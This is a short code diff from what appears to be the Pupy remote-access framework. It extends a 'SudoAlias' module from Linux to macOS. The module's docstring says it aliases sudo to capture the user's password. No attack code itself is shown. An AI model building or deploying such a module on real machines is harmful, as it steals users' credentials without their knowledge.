@@ -4,7 +4,7 @@ from pupylib.utils.credentials import Credentials
 
 __class_name__="SudoAlias"
 
-@config(compat='linux', cat="admin")
+@config(compat=['linux', 'darwin'], cat="admin")
 class SudoAlias(PupyModule):
     """ write an alias for sudo to retrieve user password """
 
